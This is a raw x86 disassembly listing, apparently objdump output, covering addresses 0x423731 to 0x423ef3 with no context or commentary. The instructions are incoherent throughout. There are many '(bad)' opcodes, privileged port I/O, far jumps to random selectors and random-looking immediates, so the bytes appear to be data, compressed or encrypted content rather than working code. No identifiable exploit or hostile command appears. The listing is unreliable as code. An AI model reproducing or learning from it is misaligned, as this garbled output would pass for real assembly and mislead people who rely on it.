  423731:	outs   dx,BYTE PTR ds:[esi]
  423732:	sub    eax,0xf055a6db
  423737:	pop    eax
  423738:	dec    edx
  423739:	jno    0x423716
  42373b:	push   ss
  42373c:	mov    edx,0x1737df5d
  423741:	fst    st(6)
  423743:	cmp    edx,DWORD PTR [edi+0x54]
  423746:	and    eax,ebx
  423748:	outs   dx,BYTE PTR ds:[esi]
  423749:	sbb    eax,0x9f6e5b11
  42374e:	aad    0x23
  423750:	and    dh,BYTE PTR [esp+ebp*2-0x49]
  423754:	lods   eax,DWORD PTR ds:[esi]
  423755:	mov    al,0x42
  423757:	and    ebp,DWORD PTR [ebx]
  423759:	ret    0x8c3a
  42375c:	jle    0x4237b8
  42375e:	out    0xba,al
  423760:	lods   eax,DWORD PTR ds:[esi]
  423761:	jne    0x423706
  423763:	sub    eax,0x1b5cd45b
  423768:	jp     0x423721
  42376a:	xchg   edi,eax
  42376b:	mov    eax,ds:0x85a5c576
  423770:	in     eax,0x73
  423772:	clc    
  423773:	enter  0xb8eb,0x24
  423777:	jbe    0x423726
  423779:	inc    esp
  42377a:	jne    0x4237f7
  42377c:	fcmove st,st(6)
  42377e:	inc    ebp
  42377f:	or     BYTE PTR [ebp-0x45fbf1fe],dh
  423785:	mov    al,0x50
  423787:	sub    bh,BYTE PTR [ebx]
  423789:	loopne 0x4237a1
  42378b:	ror    BYTE PTR [ebx+0x6dc4e29a],cl
  423791:	imul   eax,DWORD PTR [edx+0xc11b35c],0xffffffe3
  423798:	and    al,0x6c
  42379a:	add    bl,dl
  42379c:	mov    dh,0xd
  42379e:	(bad)  
  42379f:	in     eax,0xce
  4237a1:	sub    DWORD PTR [ebp+0x62],edi
  4237a4:	loop   0x423801
  4237a6:	fidiv  DWORD PTR [esi+0x5318afa6]
  4237ac:	and    ah,ch
  4237ae:	dec    esp
  4237af:	lods   eax,DWORD PTR ds:[esi]
  4237b0:	or     edx,ebx
  4237b2:	xchg   BYTE PTR [ebp-0x6d67922e],ah
  4237b8:	inc    esi
  4237b9:	inc    eax
  4237ba:	inc    edi
  4237bb:	dec    BYTE PTR [edi-0x12]
  4237be:	xchg   esi,eax
  4237bf:	add    eax,0x54fc1b6e
  4237c4:	sub    al,0x7c
  4237c6:	xor    BYTE PTR [ecx],ah
  4237c8:	test   DWORD PTR [esi+0x5],esi
  4237cb:	cmp    DWORD PTR [edx-0x5ebc3bea],esp
  4237d1:	inc    eax
  4237d2:	mov    ch,0x2d
  4237d4:	ins    BYTE PTR es:[edi],dx
  4237d5:	or     cl,BYTE PTR [eax+0xdfbcf79]
  4237db:	pop    ebp
  4237dc:	inc    eax
  4237dd:	mov    bh,0xb6
  4237df:	into   
  4237e0:	push   es
  4237e1:	imul   ecx,DWORD PTR [ecx+0x6b201267],0x6b
  4237e8:	loope  0x4237bc
  4237ea:	inc    esi
  4237eb:	fs cmc 
  4237ed:	xor    dh,dh
  4237ef:	mov    ecx,0xadd3a773
  4237f4:	and    eax,0x9a7ca0
  4237f9:	xchg   cl,dl
  4237fb:	int    0x9f
  4237fd:	scas   eax,DWORD PTR es:[edi]
  4237fe:	pop    edx
  4237ff:	fdiv   DWORD PTR [esi+0x4479c01c]
  423805:	adc    al,0xe6
  423807:	xchg   edi,eax
  423808:	lock stos DWORD PTR es:[edi],eax
  42380a:	ret    0x5c50
  42380d:	je     0x423817
  42380f:	inc    ecx
  423810:	xor    DWORD PTR [esi],0x616058dc
  423816:	lods   eax,DWORD PTR ds:[esi]
  423817:	shl    ecx,cl
  423819:	lea    ebp,[edi]
  42381b:	scas   al,BYTE PTR es:[edi]
  42381c:	loop   0x4237fe
  42381e:	mov    dh,0x95
  423820:	test   DWORD PTR [edx],edx
  423822:	cmp    BYTE PTR [esi+esi*1-0x14],ah
  423826:	or     al,0x53
  423828:	arpl   bx,sp
  42382a:	(bad)  
  42382b:	shl    BYTE PTR [esi+0x50],cl
  42382e:	add    eax,0xab19347e
  423833:	mov    dh,0xf0
  423835:	push   ebp
  423836:	test   DWORD PTR [ebx],ebx
  423838:	pop    ebx
  423839:	pop    ss
  42383a:	(bad)
  42383d:	dec    ebx
  42383e:	inc    esi
  42383f:	fdiv   QWORD PTR [esi+0x415eada5]
  423845:	push   es
  423846:	dec    BYTE PTR [ebx-0x4af704ad]
  42384c:	ds jne 0x42388f
  42384f:	pop    ebp
  423850:	sub    cl,BYTE PTR [edi-0x7a]
  423853:	shr    DWORD PTR [ebx-0x7fa5850d],0x6
  42385a:	mov    edx,0xb654011d
  42385f:	jmp    0x1ed8:0x5837a997
  423866:	inc    edi
  423867:	mov    ch,0x1a
  423869:	cdq    
  42386a:	or     eax,0x49b24119
  42386f:	add    eax,0xda455d6d
  423874:	mov    esi,0x8256f4b6
  423879:	mov    dh,0xb6
  42387b:	mov    bl,0x1c
  42387d:	and    BYTE PTR ds:0xd6b93068,bl
  423883:	mov    dh,0x83
  423885:	call   0xf186d54b
  42388a:	adc    edx,DWORD PTR [ebx+eax*8]
  42388d:	test   DWORD PTR [ecx],eax
  42388f:	jo     0x423832
  423891:	test   ecx,esi
  423893:	and    ecx,DWORD PTR [edx-0x5c]
  423896:	mov    edi,0x3608edb5
  42389b:	lods   al,BYTE PTR ds:[esi]
  42389c:	clc    
  42389d:	call   0xeda33e5
  4238a2:	xor    DWORD PTR [ebp+0xdb6d2a5],esp
  4238a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238a9:	(bad)  
  4238aa:	pop    ebp
  4238ab:	add    dh,BYTE PTR [edi+edi*4-0x56]
  4238af:	fcmovbe st,st(6)
  4238b1:	ret    0xda8d
  4238b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238b5:	int    0x69
  4238b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238b8:	xor    al,BYTE PTR [eax-0x6e]
  4238bb:	push   ebx
  4238bc:	jne    0x423902
  4238be:	ins    BYTE PTR es:[edi],dx
  4238bf:	mov    bh,0xca
  4238c1:	mov    cl,0xa3
  4238c3:	ds jne 0x42384e
  4238c6:	mov    WORD PTR [ebx-0x284f92b0],fs
  4238cc:	mov    ah,0x3e
  4238ce:	xchg   esp,eax
  4238cf:	mov    eax,ds:0x70b68e3c
  4238d4:	popa   
  4238d5:	(bad)  
  4238d6:	cmp    al,BYTE PTR [eax+0x53fa61f4]
  4238dc:	sub    bh,BYTE PTR [edx-0x7af4bee6]
  4238e2:	into   
  4238e3:	sub    ch,BYTE PTR [edx+0x1]
  4238e6:	sbb    ch,BYTE PTR [eax-0x535824a5]
  4238ec:	repnz clc 
  4238ee:	retf   
  4238ef:	dec    ebp
  4238f0:	in     al,0x73
  4238f2:	or     dh,BYTE PTR [edi-0x4489e9ca]
  4238f8:	cmp    DWORD PTR [ebx+edi*4+0x61648ac2],edi
  4238ff:	imul   ebx,DWORD PTR [ebx-0x28],0x56
  423903:	sbb    al,0x4
  423905:	enter  0x2c26,0x1f
  423909:	div    BYTE PTR [edi]
  42390b:	mov    cl,0x6d
  42390d:	mov    bh,0x76
  42390f:	dec    edx
  423910:	(bad)  
  423911:	sti    
  423912:	add    BYTE PTR [ecx+0x4f],0x56
  423916:	cmp    bl,BYTE PTR [edi+0x54]
  423919:	cmp    esp,eax
  42391b:	(bad)  
  42391c:	inc    esp
  42391d:	out    0xb2,al
  42391f:	mov    al,0x7e
  423921:	aad    0xb4
  423923:	xchg   edx,eax
  423924:	mov    ecx,0x4076b452
  423929:	sar    DWORD PTR [esi-0x499232da],cl
  42392f:	repnz lods eax,DWORD PTR ds:[esi]
  423931:	xchg   BYTE PTR [eax],ch
  423933:	stc    
  423934:	popa   
  423935:	or     al,BYTE PTR [eax]
  423937:	and    esi,DWORD PTR ds:0x74544d8f
  42393d:	fist   DWORD PTR [esi]
  42393f:	and    eax,0xb6262ffc
  423944:	mov    eax,0x5addb6a7
  423949:	shl    bh,1
  42394b:	sbb    ecx,DWORD PTR [edi+0x65]
  42394e:	rcl    DWORD PTR [ecx],0xda
  423951:	or     DWORD PTR [edx],esi
  423953:	pusha  
  423954:	pop    ebx
  423955:	stos   BYTE PTR es:[edi],al
  423956:	lods   eax,DWORD PTR ds:[esi]
  423957:	mov    gs,WORD PTR [ebx+0x8]
  42395a:	fist   DWORD PTR [ebp-0x4ae24b7f]
  423960:	mov    ebp,edx
  423962:	sub    BYTE PTR [ecx],0xc0
  423965:	call   0x4d51:0x75bb23c6
  42396c:	and    ch,0x39
  42396f:	neg    BYTE PTR ds:0x9ae05724
  423975:	sub    ch,BYTE PTR [esi+0x6d]
  423978:	stos   DWORD PTR es:[edi],eax
  423979:	or     BYTE PTR [edi+0x768bdeb6],bh
  42397f:	inc    eax
  423980:	mov    cl,0x35
  423982:	sub    bl,BYTE PTR [ebx-0x49238368]
  423988:	ins    DWORD PTR es:[edi],dx
  423989:	mov    eax,ds:0xc25e19e2
  42398e:	jmp    FWORD PTR [eax+0x73]
  423991:	cmp    esi,DWORD PTR [eax+ebp*4+0x4762238]
  423998:	bound  ecx,QWORD PTR [ecx]
  42399a:	mov    bh,0xe5
  42399c:	test   al,0x5
  42399e:	mov    al,0x45
  4239a0:	adc    BYTE PTR [ecx+0x4c],cl
  4239a3:	imul   ebp,DWORD PTR [ebx],0x54
  4239a6:	and    eax,0xb53b47c9
  4239ab:	jo     0x4239f0
  4239ad:	les    esp,FWORD PTR [ebp-0x1a6dde93]
  4239b3:	cmp    eax,DWORD PTR [edi-0x31]
  4239b6:	sbb    dh,al
  4239b8:	aad    0xe
  4239ba:	pusha  
  4239bb:	lea    ebp,[edx+0x5f]
  4239be:	adc    DWORD PTR [edi],edi
  4239c0:	xchg   ebp,eax
  4239c1:	mov    edx,0x6fcb0007
  4239c6:	lds    edx,FWORD PTR [edi+0x6e]
  4239c9:	add    BYTE PTR [edx-0x25103042],dl
  4239cf:	xchg   esi,eax
  4239d0:	cmp    ah,BYTE PTR [eax+0x18]
  4239d3:	pop    eax
  4239d4:	ror    BYTE PTR [esi-0xe],0x6a
  4239d8:	mov    esi,ebp
  4239da:	ins    DWORD PTR es:[edi],dx
  4239db:	popa   
  4239dc:	pop    ebx
  4239dd:	pop    edx
  4239de:	or     BYTE PTR ds:0x67ce4ca7,bl
  4239e4:	fisttp WORD PTR [edi+0x1136a2c5]
  4239ea:	mov    bh,0xaa
  4239ec:	and    BYTE PTR [edi-0x41fb5204],cl
  4239f2:	mov    dh,0xd1
  4239f4:	sub    BYTE PTR [edx],bh
  4239f6:	fstp   st(6)
  4239f8:	aam    0x8d
  4239fa:	loope  0x4239fe
  4239fc:	mov    al,ds:0xdedb4b6e
  423a01:	rol    DWORD PTR [edi],1
  423a03:	inc    ecx
  423a04:	iret   
  423a05:	push   0x1c065ec3
  423a0a:	push   ecx
  423a0b:	cmp    eax,DWORD PTR [edi-0x60c14e62]
  423a11:	ins    BYTE PTR es:[edi],dx
  423a12:	ins    DWORD PTR es:[edi],dx
  423a13:	pop    es
  423a14:	aam    0x62
  423a16:	fidivr DWORD PTR [edx+0xeb0b053]
  423a1c:	push   esp
  423a1d:	ins    DWORD PTR es:[edi],dx
  423a1e:	(bad)  [esi+0x71c6936d]
  423a24:	cli    
  423a25:	bnd jbe 0x423a20
  423a28:	or     dh,ch
  423a2a:	inc    ebx
  423a2b:	mov    BYTE PTR [ebp+0x2f47b012],0x46
  423a32:	std    
  423a33:	sti    
  423a34:	nop
  423a35:	push   esp
  423a36:	push   ebp
  423a37:	pop    ss
  423a38:	jno    0x4239c3
  423a3a:	test   eax,0xa961d787
  423a3f:	test   eax,0x7c6b7685
  423a44:	jge    0x423a55
  423a46:	xchg   ecx,eax
  423a47:	xlat   BYTE PTR ds:[ebx]
  423a48:	rcr    ebx,0x6c
  423a4b:	imul   ebx,DWORD PTR [ebx-0x2f],0xffffff82
  423a4f:	sbb    DWORD PTR [eax+0x7162db4c],edi
  423a55:	je     0x423aa7
  423a57:	jne    0x423ac4
  423a59:	leave  
  423a5a:	push   0xffffffd9
  423a5c:	mul    BYTE PTR [esi+0x6c2d1607]
  423a62:	sub    al,0x91
  423a64:	mov    bh,0xc6
  423a66:	js     0x423ae7
  423a68:	push   ss
  423a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a6a:	fld    TBYTE PTR [ebp-0x25]
  423a6d:	mov    dh,0xa7
  423a6f:	(bad)  
  423a70:	outs   dx,BYTE PTR ds:[esi]
  423a71:	ror    DWORD PTR [ebp-0x7a],cl
  423a74:	sub    al,0x4f
  423a76:	xor    BYTE PTR [ebx+ebp*8+0x41d856ed],cl
  423a7d:	aaa    
  423a7e:	test   BYTE PTR [edx+0x231c179a],ah
  423a84:	add    DWORD PTR [ebx+ecx*1-0x6c],0xffffffb6
  423a89:	mov    bh,dl
  423a8b:	in     al,dx
  423a8c:	xor    eax,0x2d8b7f87
  423a91:	ficomp DWORD PTR [edx]
  423a93:	sbb    eax,0xd43db408
  423a98:	test   BYTE PTR [esi-0x60123fe3],dh
  423a9e:	or     DWORD PTR [edx],ecx
  423aa0:	mov    eax,0x5634cde0
  423aa5:	mov    bh,0x15
  423aa7:	rol    ch,1
  423aa9:	(bad)  
  423aaa:	inc    esp
  423aab:	mov    ecx,0x6d4e7bff
  423ab0:	sub    BYTE PTR [edx+0x378e75d0],bh
  423ab6:	mov    ds:0xac1e4d9d,al
  423abb:	push   ecx
  423abc:	mov    bh,0x76
  423abe:	mov    eax,ds:0x600d7668
  423ac3:	sbb    eax,0xab3827f8
  423ac8:	frstor [edx+0x3ff0a4c]
  423ace:	aaa    
  423acf:	clc    
  423ad0:	call   0x6dc812ac
  423ad5:	call   0xb5d09118
  423ada:	adc    al,0xdf
  423adc:	pop    edx
  423add:	mov    ebx,edx
  423adf:	ins    DWORD PTR es:[edi],dx
  423ae0:	or     DWORD PTR ds:0xec212384,0x65671bc8
  423aea:	rcl    BYTE PTR [esi-0x5e],cl
  423aed:	mov    dh,0x2b
  423aef:	adc    BYTE PTR [ebx],0xb3
  423af2:	push   cs
  423af3:	out    dx,eax
  423af4:	mov    dh,0xed
  423af6:	ret    0xfcc6
  423af9:	pop    ebp
  423afa:	mov    edi,0x9e500b43
  423aff:	jmp    0xd6db:0x6db8a326
  423b06:	rcl    DWORD PTR [edi],1
  423b08:	mov    al,0x71
  423b0a:	adc    al,0xad
  423b0c:	xchg   edi,eax
  423b0d:	pop    ecx
  423b0e:	test   al,0x1c
  423b10:	inc    ebx
  423b11:	jne    0x423b7e
  423b13:	sub    BYTE PTR [edx+0x6a],dl
  423b16:	mov    edi,0x1aadcf18
  423b1b:	aaa    
  423b1c:	cmp    ch,BYTE PTR [eax-0x5d]
  423b1f:	js     0x423b70
  423b21:	cmc    
  423b22:	nop
  423b23:	jmp    0x423abb
  423b25:	push   es
  423b26:	je     0x423b93
  423b28:	dec    ebx
  423b29:	xchg   edi,eax
  423b2a:	jmp    0x7750a21c
  423b2f:	clc    
  423b30:	sbb    eax,0xdb6dcf7c
  423b35:	(bad)  
  423b36:	push   ebp
  423b37:	sub    al,0x80
  423b39:	cmc    
  423b3a:	test   BYTE PTR [edi-0x6b29f792],bh
  423b40:	outs   dx,BYTE PTR ds:[esi]
  423b41:	(bad)  [esi-0x65d99b9e]
  423b47:	imul   eax,DWORD PTR [edx],0x5c
  423b4a:	cli    
  423b4b:	fdiv   DWORD PTR [eax+0x6e2a1a16]
  423b51:	repz push es
  423b53:	imul   ebx,DWORD PTR [esi],0xffffffcd
  423b56:	xor    eax,edx
  423b58:	push   ecx
  423b59:	jne    0x423b36
  423b5b:	xchg   esi,eax
  423b5c:	dec    ebp
  423b5d:	cmp    al,0xb
  423b5f:	xor    bh,BYTE PTR [edx+ebx*2+0x86b63dc]
  423b66:	fcmovu st,st(3)
  423b68:	into   
  423b69:	xor    esi,ebp
  423b6b:	mov    ebp,0x56f9d250
  423b70:	stc    
  423b71:	lea    esi,[esi-0x6f]
  423b74:	mov    dl,0xfe
  423b76:	xchg   esi,eax
  423b77:	pop    ss
  423b78:	jne    0x423b7a
  423b7a:	jl     0x423b1c
  423b7c:	mov    ch,0xe5
  423b7e:	in     eax,dx
  423b7f:	rcl    dh,cl
  423b81:	xor    al,0xa9
  423b83:	cmp    BYTE PTR [edi],dl
  423b85:	fiadd  WORD PTR [esi+0xe]
  423b88:	sub    eax,0x5b6d8900
  423b8d:	push   ebx
  423b8e:	aam    0x7a
  423b90:	js     0x423b2f
  423b92:	adc    BYTE PTR ds:0xd658e0c3,al
  423b98:	(bad)  
  423b99:	(bad)  
  423b9a:	outs   dx,BYTE PTR ds:[esi]
  423b9b:	jl     0x423b84
  423b9d:	stc    
  423b9e:	xchg   edx,eax
  423b9f:	(bad)  
  423ba0:	pop    edi
  423ba1:	sub    dh,BYTE PTR [eax+0x3a]
  423ba4:	sub    eax,0x4ce58d6c
  423ba9:	stos   DWORD PTR es:[edi],eax
  423baa:	rcr    DWORD PTR [ebx],0x23
  423bad:	inc    ebx
  423bae:	xor    DWORD PTR [esi],ebx
  423bb0:	sbb    bh,BYTE PTR [edi]
  423bb2:	mov    eax,0x8991e6b4
  423bb7:	hlt    
  423bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bb9:	out    dx,eax
  423bba:	and    cl,ah
  423bbc:	xchg   ebx,eax
  423bbd:	mov    ds:0xf6283405,al
  423bc2:	test   al,0xa
  423bc4:	fwait
  423bc5:	push   0x93ad29a3
  423bca:	lods   al,BYTE PTR ds:[esi]
  423bcb:	mov    eax,ds:0x2585d676
  423bd0:	xchg   esi,eax
  423bd1:	lods   eax,DWORD PTR ds:[esi]
  423bd2:	lahf   
  423bd3:	xor    al,0x45
  423bd5:	sub    BYTE PTR [ebx+0x361f12a],ch
  423bdb:	xor    dl,cl
  423bdd:	pop    esp
  423bde:	(bad)  
  423bdf:	pop    ds
  423be0:	mov    ah,0xd
  423be2:	call   0xe2b33467
  423be7:	jmp    DWORD PTR [ebx-0x76d91989]
  423bed:	call   0x5b0:0x70096da0
  423bf4:	mov    bl,0xf9
  423bf6:	and    ebp,DWORD PTR [edi+esi*1+0x16]
  423bfa:	ss and edx,esi
  423bfd:	test   eax,0xed1f0926
  423c02:	enter  0x8a99,0x6d
  423c06:	fist   DWORD PTR [ebp-0x13]
  423c09:	pop    es
  423c0a:	jae    0x423c5c
  423c0c:	jp     0x423c16
  423c0e:	fild   DWORD PTR es:0x36e82ec0
  423c15:	and    eax,0xd42f951b
  423c1a:	mov    dh,0x21
  423c1c:	loop   0x423c60
  423c1e:	push   0xffffffcf
  423c20:	aaa    
  423c21:	dec    edx
  423c22:	jns    0x423c6e
  423c24:	push   cs
  423c25:	aaa    
  423c26:	push   ss
  423c27:	mov    dh,0x8d
  423c29:	in     eax,dx
  423c2a:	mov    esp,ebx
  423c2c:	(bad)  
  423c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c2e:	aaa    
  423c2f:	int3   
  423c30:	xor    eax,0x7682859c
  423c35:	imul   esi,DWORD PTR [edi+0x32],0x30
  423c39:	jecxz  0x423bd3
  423c3b:	les    ebp,FWORD PTR [esi]
  423c3d:	or     dl,BYTE PTR ss:[ecx]
  423c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c41:	mov    ebp,0xd826d86b
  423c46:	cs mov ah,0x87
  423c49:	jp     0x423c45
  423c4b:	jbe    0x423c05
  423c4d:	pop    ss
  423c4e:	fidivr WORD PTR [esi]
  423c50:	mov    ebx,0xaa506ed4
  423c55:	mov    edi,DWORD PTR fs:[edi+0xe1648e0]
  423c5c:	ins    DWORD PTR es:[edi],dx
  423c5d:	sbb    ebp,ebp
  423c5f:	push   edx
  423c60:	mov    dh,0xa5
  423c62:	adc    ecx,DWORD PTR [ebp-0x13]
  423c65:	ins    DWORD PTR es:[edi],dx
  423c66:	or     BYTE PTR [ebp-0x49129392],bl
  423c6c:	pop    edi
  423c6d:	mov    esi,0xfb0165bf
  423c72:	stos   BYTE PTR es:[edi],al
  423c73:	sbb    bh,BYTE PTR [edx+0x535b0aef]
  423c79:	mov    ah,0x2b
  423c7b:	mov    ah,0x64
  423c7d:	xchg   ebp,eax
  423c7e:	and    BYTE PTR [edx-0x53],0xcd
  423c82:	mov    fs,WORD PTR [eax+0x55504b85]
  423c88:	adc    cl,BYTE PTR [edx]
  423c8a:	pop    ss
  423c8b:	or     DWORD PTR [ebx+0x47],ebx
  423c8e:	(bad)  
  423c90:	add    eax,0xcc0b6b90
  423c95:	sbb    eax,0x984a3b9e
  423c9a:	fistp  DWORD PTR [eax+0x6a]
  423c9d:	dec    ebp
  423c9e:	outs   dx,BYTE PTR ds:[esi]
  423c9f:	add    eax,0x5a0e508c
  423ca4:	aad    0xb3
  423ca6:	push   0xe5696db7
  423cab:	sbb    ch,BYTE PTR [edx+0x2c]
  423cae:	mov    edx,?
  423cb0:	std    
  423cb1:	pop    ecx
  423cb2:	lds    esp,FWORD PTR [ebx+0x383805b5]
  423cb8:	push   es
  423cb9:	stos   BYTE PTR es:[edi],al
  423cba:	or     eax,0xa5c00751
  423cbf:	adc    BYTE PTR gs:[ecx-0x66896165],bl
  423cc6:	stos   BYTE PTR es:[edi],al
  423cc7:	or     ebx,DWORD PTR [ebx+0x5b]
  423cca:	les    edi,FWORD PTR [edi+edx*8+0x1d3a20f1]
  423cd1:	sbb    BYTE PTR [eax+0x6a],0xdb
  423cd5:	push   es
  423cd6:	mov    ebx,ebp
  423cd8:	test   DWORD PTR [edi-0x36caf718],ecx
  423cde:	mov    dh,0x5b
  423ce0:	sub    ebx,eax
  423ce2:	pcmpeqb mm3,QWORD PTR [ecx+edx*1+0x4f]
  423ce7:	scas   al,BYTE PTR es:[edi]
  423ce8:	lods   eax,DWORD PTR ds:[esi]
  423ce9:	data16 mov dh,0xdb
  423cec:	ret    0x2cd6
  423cef:	(bad)  [esi-0x39]
  423cf2:	or     al,0x1a
  423cf4:	and    dh,dl
  423cf6:	push   ebx
  423cf7:	mov    ecx,0xd1bb68a1
  423cfc:	jmp    0xaa4b70b8
  423d01:	pop    ecx
  423d02:	and    ebp,DWORD PTR ds:0xddb47c6c
  423d08:	and    eax,0xa84b22f1
  423d0d:	outs   dx,DWORD PTR ds:[si]
  423d0f:	fsubr  QWORD PTR [eax-0x76]
  423d12:	mov    eax,0xc84ac20
  423d17:	pushf  
  423d18:	or     DWORD PTR [eax-0x38],esi
  423d1b:	jl     0x423d7e
  423d1d:	fld    TBYTE PTR [eax-0x28]
  423d20:	nop
  423d21:	adc    BYTE PTR [ecx],0x7d
  423d24:	xor    edi,esp
  423d26:	push   es
  423d27:	add    BYTE PTR [edi-0x49393925],cl
  423d2d:	push   0x9f815b44
  423d32:	ret    
  423d33:	scas   eax,DWORD PTR es:[edi]
  423d34:	mov    dh,0x1
  423d36:	dec    edx
  423d37:	aaa    
  423d38:	pop    edx
  423d39:	inc    esp
  423d3a:	outs   dx,DWORD PTR ss:[esi]
  423d3c:	inc    esi
  423d3d:	out    dx,eax
  423d3e:	das    
  423d3f:	or     BYTE PTR [ebx],0xe5
  423d42:	pop    ss
  423d43:	add    al,0x7d
  423d45:	cli    
  423d46:	add    BYTE PTR [edx+0x4bc7fad],ah
  423d4c:	(bad)  
  423d4d:	cli    
  423d4e:	les    ecx,FWORD PTR [esi]
  423d50:	test   al,0xa2
  423d52:	dec    edx
  423d53:	retf   0x7f4
  423d56:	and    eax,0xed6ed4f5
  423d5b:	(bad)  
  423d5c:	aas    
  423d5d:	sub    dh,ch
  423d5f:	rcl    BYTE PTR [edx+0x598cf0da],0x6c
  423d66:	or     ebx,DWORD PTR [ebx-0x45]
  423d69:	cmp    eax,edi
  423d6b:	push   0x7a
  423d6d:	xor    eax,0x2cfbbb28
  423d72:	push   edx
  423d73:	push   cs
  423d74:	loop   0x423d4c
  423d76:	outs   dx,BYTE PTR ds:[esi]
  423d77:	adc    eax,0x8c869ab6
  423d7c:	mov    cl,0x2f
  423d7e:	test   BYTE PTR [esi+0x58b75535],dh
  423d84:	into   
  423d85:	xchg   esi,eax
  423d87:	in     eax,dx
  423d88:	loopne 0x423d25
  423d8a:	ror    BYTE PTR [edi-0x12b44a46],0xe3
  423d91:	out    0xaa,eax
  423d93:	push   esi
  423d94:	mov    bl,0x3
  423d96:	je     0x423d9d
  423d98:	dec    ecx
  423d99:	cmp    ah,BYTE PTR [ecx+0x1caae858]
  423d9f:	ins    BYTE PTR es:[edi],dx
  423da0:	dec    esp
  423da1:	es cmp al,0xb6
  423da4:	outs   dx,BYTE PTR ds:[esi]
  423da5:	or     ebp,DWORD PTR [ebp+0x79]
  423da8:	mov    DWORD PTR [edi],esi
  423daa:	mov    ecx,0x43d9bc29
  423daf:	movaps xmm2,xmm4
  423db2:	mov    dh,0xd5
  423db4:	dec    edx
  423db5:	jo     0x423d3d
  423db7:	inc    edi
  423db8:	loopne 0x423db6
  423dba:	scas   al,BYTE PTR es:[edi]
  423dbb:	fadd   DWORD PTR [ecx]
  423dbd:	je     0x423d6a
  423dbf:	jo     0x423d4f
  423dc1:	pop    edi
  423dc2:	hlt    
  423dc3:	sub    eax,DWORD PTR [ebx+0x35]
  423dc6:	or     eax,0xf720ea36
  423dcb:	fild   QWORD PTR [edx+0x50]
  423dce:	lods   eax,DWORD PTR ds:[esi]
  423dcf:	mov    dh,0xb1
  423dd1:	xor    eax,0x988a90d5
  423dd6:	inc    ecx
  423dd7:	cmp    cl,al
  423dd9:	arpl   WORD PTR [edi],si
  423ddb:	mov    DWORD PTR [edi-0x781e9ff2],esi
  423de1:	jmp    0x7259457a
  423de6:	push   0xb6a8ecb1
  423deb:	cld    
  423dec:	sbb    ebp,DWORD PTR [eax-0x56f6fff1]
  423df2:	add    BYTE PTR [edi],dl
  423df4:	pusha  
  423df5:	jle    0x423dda
  423df7:	push   ss
  423df8:	shl    DWORD PTR [esi-0x3843abeb],1
  423dfe:	clc    
  423dff:	(bad)  
  423e01:	ret    0xdb6d
  423e04:	mov    dh,0x38
  423e06:	mov    BYTE PTR [ebp+0x6e],ah
  423e09:	xchg   edx,eax
  423e0a:	inc    esi
  423e0b:	sbb    eax,0x1b97afcb
  423e10:	pop    ebp
  423e11:	rol    BYTE PTR [ebp+0x1ef1f891],0xdc
  423e18:	xchg   DWORD PTR [ebx+edi*4],ecx
  423e1b:	mov    ch,0x5b
  423e1d:	test   DWORD PTR [ecx+0x7f],ecx
  423e20:	mov    ch,0xab
  423e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e23:	ret    0xca7a
  423e26:	add    dl,BYTE PTR [edx+0x65b555ad]
  423e2c:	aad    0xde
  423e2e:	dec    ebp
  423e2f:	jge    0x423e42
  423e31:	(bad)  [ebp+0x33b8c2c2]
  423e37:	idiv   DWORD PTR [ebx]
  423e39:	sbb    DWORD PTR [esi],ecx
  423e3b:	mov    ds:0xdf8dd792,al
  423e40:	dec    edx
  423e41:	aaa    
  423e42:	or     dl,dh
  423e44:	xor    BYTE PTR [eax],bl
  423e46:	mov    edi,0x3cc0e0d1
  423e4b:	add    BYTE PTR [edi-0x72],al
  423e4e:	push   0xffffffdb
  423e50:	xchg   esi,eax
  423e51:	xor    al,0xf9
  423e53:	das    
  423e54:	adc    DWORD PTR [edx-0x6],edi
  423e57:	mov    ch,0x15
  423e59:	(bad)  
  423e5b:	test   DWORD PTR [ecx],esp
  423e5d:	test   DWORD PTR [ecx-0x1a],ebx
  423e60:	xchg   ebp,eax
  423e61:	add    bh,BYTE PTR [edx-0x257925e9]
  423e67:	ss mov ecx,0x103865fa
  423e6d:	inc    eax
  423e6e:	mov    al,ds:0x6dd0506e
  423e73:	imul   edx,DWORD PTR [edi+0x1a6171bf],0xb
  423e7a:	inc    ecx
  423e7b:	out    dx,eax
  423e7c:	loope  0x423e70
  423e7e:	mov    al,0x6d
  423e80:	pop    ebx
  423e81:	pop    es
  423e82:	idiv   DWORD PTR [edx]
  423e84:	and    ecx,DWORD PTR [edi+0x336e523e]
  423e8a:	mov    es,WORD PTR [edx-0x2f]
  423e8d:	mov    dh,0xe2
  423e8f:	push   edi
  423e90:	ds push ds
  423e92:	sbb    BYTE PTR ds:[ebp+0x6e8009ad],al
  423e99:	pop    es
  423e9a:	out    0x68,al
  423e9c:	pop    ebp
  423e9d:	xchg   ecx,eax
  423e9e:	ins    DWORD PTR es:[edi],dx
  423e9f:	pop    ebx
  423ea0:	push   0xbdf865b7
  423ea5:	lods   eax,DWORD PTR ds:[esi]
  423ea6:	xchg   BYTE PTR [eax],ch
  423ea8:	outs   dx,DWORD PTR ds:[esi]
  423ea9:	loopne 0x423e91
  423eab:	sti    
  423eac:	pop    ebx
  423ead:	push   edi
  423eae:	(bad)  
  423eaf:	shl    BYTE PTR [ebx+0x28],cl
  423eb2:	ret    0xbc26
  423eb5:	push   edi
  423eb6:	(bad)  
  423eb7:	clc    
  423eb8:	mov    ch,0xd5
  423eba:	cs sub eax,0x4ef40558
  423ec0:	lods   eax,DWORD PTR ds:[esi]
  423ec1:	or     eax,0xd8a8e49b
  423ec6:	mov    eax,0xbdf3e04f
  423ecb:	sub    eax,0x82a6da98
  423ed0:	dec    ebx
  423ed1:	add    edx,edx
  423ed3:	std    
  423ed4:	jno    0x423f4e
  423ed6:	jb     0x423f31
  423ed8:	(bad)  
  423ed9:	and    eax,0xdba1db68
  423ede:	cmp    BYTE PTR [edi],al
  423ee0:	mov    edx,0xb5a300b6
  423ee5:	fnsave [esi-0x1f7d702b]
  423eeb:	mov    dl,0xe2
  423eed:	jmp    0xa5454f86
  423ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ef3:	ins    DWORD PTR es:[edi],dx
